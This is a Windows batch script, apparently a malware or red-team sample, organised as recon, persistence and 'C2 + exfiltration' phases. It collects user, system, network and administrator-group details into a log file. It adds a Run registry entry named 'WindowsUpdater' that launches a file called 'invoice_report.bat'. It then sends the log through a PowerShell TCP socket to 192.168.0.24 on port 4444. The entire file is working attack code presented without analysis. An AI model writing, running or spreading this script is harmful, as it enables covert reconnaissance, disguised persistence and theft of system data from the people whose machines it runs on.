@echo off

REM === PHASE 1: RECON ===
whoami > "%USERPROFILE%\incident_log.txt"
systeminfo >> "%USERPROFILE%\incident_log.txt"
ipconfig >> "%USERPROFILE%\incident_log.txt"
net user >> "%USERPROFILE%\incident_log.txt"
net localgroup administrators >> "%USERPROFILE%\incident_log.txt"

REM === PHASE 2: PERSISTENCE ===
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdater" /t REG_SZ /d "%USERPROFILE%\invoice_report.bat" /f

REM === PHASE 3: C2 + EXFILTRATION ===
powershell -c "$data = Get-Content '%USERPROFILE%\incident_log.txt' | Out-String; $client = New-Object Net.Sockets.TCPClient('192.168.0.24', 4444); $stream = $client.GetStream(); $bytes = [System.Text.Encoding]::UTF8.GetBytes($data); $stream.Write($bytes, 0, $bytes.Length); $client.Close()"
